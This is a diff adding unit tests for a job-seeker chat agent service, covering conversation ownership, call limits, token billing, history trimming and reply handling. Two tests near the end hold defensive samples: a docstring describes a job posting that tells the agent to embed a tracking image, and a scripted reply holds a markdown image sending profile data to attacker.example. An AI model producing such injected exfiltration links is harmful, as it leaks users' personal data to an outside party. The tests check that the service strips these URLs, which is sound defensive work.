@@ -2065,3 +2065,332 @@ class ScriptedFakeChatModelTests(TestCase):
             AIMessage(content="hi", usage_metadata={
                 "input_tokens": 11, "output_tokens": 3, "total_tokens": 14})])
         self.assertEqual(model.invoke("x").usage_metadata["input_tokens"], 11)
+
+
+class _ChatServiceFixture(_ChatToolFixture):
+    def _saver(self):
+        from langgraph.checkpoint.memory import InMemorySaver
+        return InMemorySaver()
+
+    def _reply(self, text, *, tokens=(100, 20)):
+        from langchain_core.messages import AIMessage
+        return AIMessage(content=text, usage_metadata={
+            "input_tokens": tokens[0], "output_tokens": tokens[1],
+            "total_tokens": sum(tokens)})
+
+    def _toolcall(self, name, args, *, tokens=(10, 5), call_id="call-1"):
+        from langchain_core.messages import AIMessage
+        return AIMessage(content="", tool_calls=[
+            {"name": name, "args": args, "id": call_id}], usage_metadata={
+            "input_tokens": tokens[0], "output_tokens": tokens[1],
+            "total_tokens": sum(tokens)})
+
+    def _send(self, message, *, responses, conversation_id=None, user=None,
+              checkpointer=None):
+        from apps.ai.services import send_chat_message
+        from apps.ai.testing import ScriptedFakeChatModel
+        return send_chat_message(
+            user or self.seeker, message=message, conversation_id=conversation_id,
+            model=ScriptedFakeChatModel(responses=responses),
+            checkpointer=checkpointer or self._saver())
+
+
+class SendChatMessageTests(_ChatServiceFixture, TestCase):
+    # --- conversation lifecycle ---------------------------------------------
+
+    def test_creates_conversation_and_returns_id_and_reply(self):
+        from apps.ai.models import Conversation
+        out = self._send("find python jobs", responses=[self._reply("Here are some.")])
+        self.assertEqual(out["reply"], "Here are some.")
+        self.assertEqual(Conversation.objects.count(), 1)
+        self.assertEqual(out["conversation_id"], str(Conversation.objects.get().id))
+
+    def test_title_is_first_message_truncated_to_60_chars(self):
+        from apps.ai.models import Conversation
+        from apps.ai.services import CONVERSATION_TITLE_CHARS
+        self._send("z" * 200, responses=[self._reply("ok")])
+        title = Conversation.objects.get().title
+        self.assertEqual(len(title), CONVERSATION_TITLE_CHARS)
+        self.assertEqual(title, "z" * CONVERSATION_TITLE_CHARS)
+
+    def test_title_is_set_once_and_never_rewritten(self):
+        from apps.ai.models import Conversation
+        saver = self._saver()
+        first = self._send("original title", responses=[self._reply("a")],
+                           checkpointer=saver)
+        self._send("a completely different second message",
+                   responses=[self._reply("b")],
+                   conversation_id=first["conversation_id"], checkpointer=saver)
+        self.assertEqual(Conversation.objects.get().title, "original title")
+
+    def test_continuing_a_conversation_reuses_the_id(self):
+        saver = self._saver()
+        first = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
+        second = self._send("again", responses=[self._reply("yes")],
+                            conversation_id=first["conversation_id"], checkpointer=saver)
+        self.assertEqual(first["conversation_id"], second["conversation_id"])
+
+    def test_history_persists_across_turns(self):
+        saver = self._saver()
+        first = self._send("remember this", responses=[self._reply("noted")],
+                           checkpointer=saver)
+        self._send("and this", responses=[self._reply("noted again")],
+                   conversation_id=first["conversation_id"], checkpointer=saver)
+        stored = saver.get_tuple(
+            {"configurable": {"thread_id": first["conversation_id"]}}
+        ).checkpoint["channel_values"]["messages"]
+        self.assertEqual(len(stored), 4)
+
+    # --- ownership -----------------------------------------------------------
+
+    def test_another_users_conversation_is_not_found(self):
+        from apps.ai.exceptions import ConversationNotFoundError
+        from apps.ai.models import Conversation
+        intruder = UserAccount.objects.create_user(
+            email="nosy@example.com", password="Str0ng-Password!", user_type="job_seeker")
+        mine = Conversation.objects.create(user=self.seeker, title="private")
+        with self.assertRaises(ConversationNotFoundError):
+            self._send("who are you talking to", responses=[self._reply("x")],
+                       conversation_id=str(mine.id), user=intruder)
+
+    def test_unknown_conversation_id_raises_not_found(self):
+        from apps.ai.exceptions import ConversationNotFoundError
+        with self.assertRaises(ConversationNotFoundError):
+            self._send("hi", responses=[self._reply("x")],
+                       conversation_id="00000000-0000-0000-0000-000000000000")
+
+    def test_malformed_conversation_id_raises_not_found_not_500(self):
+        from apps.ai.exceptions import ConversationNotFoundError
+        with self.assertRaises(ConversationNotFoundError):
+            self._send("hi", responses=[self._reply("x")], conversation_id="not-a-uuid")
+
+    # --- the agent loop ------------------------------------------------------
+
+    def test_agent_can_call_a_tool_and_answer(self):
+        out = self._send("any python roles?", responses=[
+            self._toolcall("search_jobs", {"keywords": "python"}),
+            self._reply("Yes — Senior Python Developer."),
+        ])
+        self.assertEqual(out["reply"], "Yes — Senior Python Developer.")
+
+    def test_uses_the_pro_tier_with_the_agent_timeout_and_output_cap(self):
+        """Every other test injects a fake, so nothing else would catch a
+        regression of the tier, the raised timeout, or the output cap."""
+        from apps.ai.services import (CHAT_MAX_OUTPUT_TOKENS,
+                                      CHAT_MODEL_TIMEOUT_SECONDS,
+                                      send_chat_message)
+        from apps.ai.testing import ScriptedFakeChatModel
+        with patch("apps.ai.services.get_model") as mocked:
+            mocked.return_value = ScriptedFakeChatModel(responses=[self._reply("ok")])
+            send_chat_message(self.seeker, message="hi", checkpointer=self._saver())
+        mocked.assert_called_once_with(
+            'pro', timeout=CHAT_MODEL_TIMEOUT_SECONDS,
+            max_output_tokens=CHAT_MAX_OUTPUT_TOKENS)
+
+    # --- billing -------------------------------------------------------------
+
+    def test_logs_exactly_one_usage_row_per_turn(self):
+        from apps.ai.models import AIUsageLog
+        self._send("hi", responses=[
+            self._toolcall("search_jobs", {"keywords": "python"}),
+            self._reply("done")])
+        self.assertEqual(AIUsageLog.objects.filter(feature="chat").count(), 1)
+
+    def test_usage_row_sums_tokens_across_the_whole_turn(self):
+        from apps.ai.models import AIUsageLog
+        self._send("hi", responses=[
+            self._toolcall("search_jobs", {"keywords": "python"}, tokens=(10, 5)),
+            self._reply("done", tokens=(100, 20))])
+        row = AIUsageLog.objects.get(feature="chat")
+        self.assertEqual(row.input_tokens, 110)
+        self.assertEqual(row.output_tokens, 25)
+
+    def test_second_turn_does_not_rebill_the_first(self):
+        """invoke() returns the FULL history; naive summing double-bills."""
+        from apps.ai.models import AIUsageLog
+        saver = self._saver()
+        first = self._send("turn one", responses=[self._reply("a", tokens=(100, 40))],
+                           checkpointer=saver)
+        self._send("turn two", responses=[self._reply("b", tokens=(500, 7))],
+                   conversation_id=first["conversation_id"], checkpointer=saver)
+        rows = AIUsageLog.objects.filter(feature="chat").order_by("created_at")
+        self.assertEqual([(r.input_tokens, r.output_tokens) for r in rows],
+                         [(100, 40), (500, 7)])
+
+    def test_a_turn_that_hits_the_call_bound_still_writes_a_usage_row(self):
+        """Eight Pro calls were billed by the provider before the bound fired.
+        Losing that row hides real, user-triggerable spend."""
+        from apps.ai.exceptions import AgentLimitExceededError
+        from apps.ai.models import AIUsageLog
+        from apps.ai.services import MAX_MODEL_CALLS_PER_TURN
+        responses = [self._toolcall("search_jobs", {"keywords": "x"}, call_id=f"c{i}")
+                     for i in range(MAX_MODEL_CALLS_PER_TURN + 2)]
+        with self.assertRaises(AgentLimitExceededError):
+            self._send("loop forever", responses=responses)
+        row = AIUsageLog.objects.get(feature="chat")
+        self.assertGreater(row.input_tokens, 0)
+
+    # --- bounds --------------------------------------------------------------
+
+    def test_per_turn_call_bound_raises_agent_limit_exceeded(self):
+        """exit_behavior='error'; the default 'end' would return the string
+        'Model call limits exceeded: run limit (8/8)' to the user as a reply."""
+        from apps.ai.exceptions import AgentLimitExceededError
+        from apps.ai.services import MAX_MODEL_CALLS_PER_TURN
+        responses = [self._toolcall("search_jobs", {"keywords": "x"}, call_id=f"c{i}")
+                     for i in range(MAX_MODEL_CALLS_PER_TURN + 2)]
+        with self.assertRaises(AgentLimitExceededError) as ctx:
+            self._send("loop forever", responses=responses)
+        # The library's synthetic message must never become the user's reply.
+        self.assertNotIn("limits exceeded", str(ctx.exception).lower())
+
+    def test_lifetime_thread_bound_raises_conversation_exhausted(self):
+        """thread_limit is checkpointed and cumulative: once hit, EVERY later
+        turn raises. That is not a timeout and must not be reported as one."""
+        from apps.ai.exceptions import ConversationExhaustedError
+        from apps.ai.services import MAX_MODEL_CALLS_PER_THREAD
+        saver = self._saver()
+        out = self._send("first", responses=[self._reply("hi")], checkpointer=saver)
+        cid = out["conversation_id"]
+        with patch("apps.ai.services.MAX_MODEL_CALLS_PER_THREAD", 1):
+            with self.assertRaises(ConversationExhaustedError):
+                self._send("second", responses=[self._reply("hi again")],
+                           conversation_id=cid, checkpointer=saver)
+        self.assertGreater(MAX_MODEL_CALLS_PER_THREAD, 1)
+
+    def test_deadline_raises_agent_limit_exceeded(self):
+        from apps.ai.exceptions import AgentLimitExceededError
+        with patch("apps.ai.services.CHAT_DEADLINE_SECONDS", -1):
+            with self.assertRaises(AgentLimitExceededError):
+                self._send("hi", responses=[self._reply("never reached")])
+
+    def test_history_sent_to_the_model_is_capped(self):
+        """Full history stays in the checkpoint; the model's view is trimmed.
+        A @before_model hook cannot do this — add_messages appends.
+
+        Counts NON-SYSTEM messages only: create_agent prepends the system
+        prompt after middleware runs, so it is never part of the trimmed list.
+        """
+        from langchain_core.messages import SystemMessage
+        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
+        from apps.ai.testing import ScriptedFakeChatModel
+
+        seen = []
+
+        class _Recording(ScriptedFakeChatModel):
+            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
+                seen.append(sum(1 for m in messages
+                                if not isinstance(m, SystemMessage)))
+                return super()._generate(messages, stop, run_manager, **kwargs)
+
+        saver = self._saver()
+        conversation_id = None
+        for turn in range(CHAT_HISTORY_MESSAGES):
+            out = send_chat_message(
+                self.seeker, message=f"turn {turn}", conversation_id=conversation_id,
+                model=_Recording(responses=[self._reply(f"r{turn}")]),
+                checkpointer=saver)
+            conversation_id = out["conversation_id"]
+        self.assertLessEqual(max(seen), CHAT_HISTORY_MESSAGES)
+        self.assertGreater(len(seen), CHAT_HISTORY_MESSAGES // 2)
+
+    def test_trimming_never_orphans_a_tool_message(self):
+        """A raw tail slice starts the window on a ToolMessage whose parent
+        AIMessage was cut. Gemini rejects a functionResponse with no preceding
+        functionCall, so such a turn 502s — invisible to a fake model unless
+        asserted directly."""
+        from langchain_core.messages import AIMessage, SystemMessage, ToolMessage
+        from apps.ai.services import CHAT_HISTORY_MESSAGES, send_chat_message
+        from apps.ai.testing import ScriptedFakeChatModel
+
+        windows = []
+
+        class _Recording(ScriptedFakeChatModel):
+            def _generate(self, messages, stop=None, run_manager=None, **kwargs):
+                windows.append([m for m in messages
+                                if not isinstance(m, SystemMessage)])
+                return super()._generate(messages, stop, run_manager, **kwargs)
+
+        saver = self._saver()
+        conversation_id = None
+        # Each turn is 4 messages (Human, AI+tool_call, Tool, AI), so the
+        # boundary lands mid tool-sequence well before the loop ends.
+        for turn in range(CHAT_HISTORY_MESSAGES):
+            out = send_chat_message(
+                self.seeker, message=f"turn {turn}", conversation_id=conversation_id,
+                model=_Recording(responses=[
+                    self._toolcall("search_jobs", {"keywords": "python"},
+                                   call_id=f"c{turn}"),
+                    self._reply(f"r{turn}")]),
+                checkpointer=saver)
+            conversation_id = out["conversation_id"]
+
+        for window in windows:
+            for i, message in enumerate(window):
+                if isinstance(message, ToolMessage):
+                    parent = window[i - 1] if i else None
+                    self.assertTrue(
+                        isinstance(parent, AIMessage) and parent.tool_calls,
+                        "orphaned ToolMessage in the model's window")
+
+    # --- provider failures ---------------------------------------------------
+
+    def test_provider_error_is_classified(self):
+        from apps.ai.exceptions import AIProviderError
+        with self.assertRaises(AIProviderError):
+            self._send("hi", responses=[RuntimeError("503 backend unavailable")])
+
+    def test_quota_error_is_classified(self):
+        from apps.ai.exceptions import AIQuotaExceededError
+        with self.assertRaises(AIQuotaExceededError):
+            self._send("hi", responses=[RuntimeError("RESOURCE_EXHAUSTED")])
+
+    def test_failed_first_turn_rolls_back_the_new_conversation(self):
+        """Otherwise a retry loop leaves one empty conversation per attempt."""
+        from apps.ai.exceptions import AIProviderError
+        from apps.ai.models import Conversation
+        with self.assertRaises(AIProviderError):
+            self._send("hi", responses=[RuntimeError("503 backend unavailable")])
+        self.assertEqual(Conversation.objects.count(), 0)
+
+    def test_failure_on_an_existing_conversation_never_deletes_it(self):
+        from apps.ai.exceptions import AIProviderError
+        from apps.ai.models import Conversation
+        saver = self._saver()
+        first = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
+        with self.assertRaises(AIProviderError):
+            self._send("boom", responses=[RuntimeError("503 backend unavailable")],
+                       conversation_id=first["conversation_id"], checkpointer=saver)
+        self.assertEqual(Conversation.objects.count(), 1)
+
+    # --- the reply itself ----------------------------------------------------
+
+    def test_reply_is_a_string_even_for_block_content(self):
+        """A Pro/thinking model can return content blocks; the OpenAPI contract
+        and the frontend both promise a string."""
+        from langchain_core.messages import AIMessage
+        out = self._send("hi", responses=[AIMessage(
+            content=[{"type": "text", "text": "Hello "},
+                     {"type": "text", "text": "world"}],
+            usage_metadata={"input_tokens": 1, "output_tokens": 1, "total_tokens": 2})])
+        self.assertEqual(out["reply"], "Hello world")
+
+    def test_reply_strips_markdown_images_that_would_exfiltrate_the_profile(self):
+        """A job description can instruct the agent to embed a tracking image.
+        Rendering it would beacon the seeker's data to the post's author."""
+        out = self._send("tell me about the job", responses=[self._reply(
+            "Good fit! ![](https://attacker.example/p?d=Ada%20Lovelace%20Python)")])
+        self.assertNotIn("attacker.example", out["reply"])
+        self.assertIn("Good fit!", out["reply"])
+
+    def test_reply_strips_bare_urls_and_keeps_link_text(self):
+        out = self._send("hi", responses=[self._reply(
+            "See [this role](https://attacker.example/x) or https://attacker.example/y")])
+        self.assertNotIn("attacker.example", out["reply"])
+        self.assertIn("this role", out["reply"])
+
+    def test_never_logs_the_message_body(self):
+        with self.assertLogs("apps.ai", level="INFO") as logs:
+            self._send("my secret salary expectation is 200k",
+                       responses=[self._reply("noted")])
+        self.assertNotIn("200k", "\n".join(logs.output))
